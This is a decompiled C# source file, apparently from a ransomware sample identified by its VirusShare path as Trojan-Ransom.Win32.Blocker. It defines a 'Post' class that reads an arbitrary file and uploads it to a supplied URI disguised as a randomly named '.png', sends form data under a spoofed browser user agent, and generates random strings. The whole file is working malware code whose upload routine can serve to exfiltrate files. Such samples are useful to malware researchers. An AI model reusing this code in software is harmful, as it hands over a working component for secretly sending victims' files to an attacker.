// Decompiled with JetBrains decompiler
// Type: Post
// Assembly: ServerPHP, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 6F25B3EA-9C2B-406D-A5C7-3B7C6942C4C5
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.kwu-cbd4f8ac3865079e515f22b836eb2d279bf8687da866b97896c91bd38f105d09.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.IO;
using System.Net;
using System.Text;

public class Post
{
  public static string UploadImage(string uri, string filePath)
  {
    string randomString = Post.RandomText.GenerateRandomString(20);
    string str;
    try
    {
      string requestUriString = uri;
      string randomFileName = Path.GetRandomFileName();
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.AppendLine("--" + randomFileName);
      stringBuilder.Append("Content-Disposition: form-data; name=\"uploadedfile\";");
      stringBuilder.AppendFormat("filename=\"{0}\"", (object) (randomString + ".png"));
      stringBuilder.AppendLine();
      stringBuilder.AppendLine("Content-Type: application/octet-stream");
      stringBuilder.AppendLine();
      byte[] bytes1 = Encoding.UTF8.GetBytes(stringBuilder.ToString());
      byte[] bytes2 = Encoding.ASCII.GetBytes("\r\n--" + randomFileName + "--\r\n");
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
      httpWebRequest.ContentType = "multipart/form-data; boundary=" + randomFileName;
      httpWebRequest.ContentLength = checked ((long) bytes1.Length + new FileInfo(filePath).Length + (long) bytes2.Length);
      httpWebRequest.Method = "POST";
      Stream requestStream = httpWebRequest.GetRequestStream();
      requestStream.Write(bytes1, 0, bytes1.Length);
      byte[] buffer = MyProject.Computer.FileSystem.ReadAllBytes(filePath);
      requestStream.Write(buffer, 0, buffer.Length);
      requestStream.Write(bytes2, 0, bytes2.Length);
      requestStream.Close();
      httpWebRequest.Abort();
      requestStream.Dispose();
      str = randomString;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str = "An error has occured uploading the image.";
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static object SendData(
    Uri url,
    Post.RequestMethods method,
    StringBuilder data,
    Post.RequestUserAgent agent = Post.RequestUserAgent.MozillaFireFox)
  {
    WebRequest webRequest = WebRequest.Create(url);
    byte[] bytes = Encoding.ASCII.GetBytes(data.ToString());
    switch (method)
    {
      case Post.RequestMethods.Post:
        webRequest.Method = "POST";
        break;
      case Post.RequestMethods.Get:
        webRequest.Method = "GET";
        break;
      case Post.RequestMethods.Request:
        webRequest.Method = "REQUEST";
        break;
      default:
        return (object) new Exception("Unknown request method.");
    }
    switch (agent)
    {
      case Post.RequestUserAgent.MozillaFireFox:
        ((HttpWebRequest) webRequest).UserAgent = "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)";
        break;
      case Post.RequestUserAgent.InternetExplorer:
        ((HttpWebRequest) webRequest).UserAgent = "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)";
        break;
      default:
        return (object) new Exception("Unknown user agent.");
    }
    webRequest.ContentLength = (long) bytes.Length;
    webRequest.ContentType = "application/x-www-form-urlencoded";
    Stream requestStream = webRequest.GetRequestStream();
    requestStream.Write(bytes, 0, bytes.Length);
    requestStream.Close();
    return (object) new StreamReader(webRequest.GetResponse().GetResponseStream()).ReadToEnd();
  }

  public enum RequestMethods
  {
    Post,
    Get,
    Request,
  }

  public class RandomText
  {
    public static string GenerateRandomString(int length)
    {
      VBMath.Randomize();
      Random random = new Random();
      string randomString = "";
      int num1 = checked (length - 1);
      int num2 = 0;
      while (num2 <= num1)
      {
        byte num3 = checked ((byte) random.Next(65, 122));
        if (num3 > (byte) 96 || num3 < (byte) 91)
          randomString += Encoding.ASCII.GetString(new byte[1]
          {
            num3
          });
        else
          checked { --num2; }
        checked { ++num2; }
      }
      return randomString;
    }
  }

  public enum RequestUserAgent
  {
    MozillaFireFox,
    InternetExplorer,
  }
}
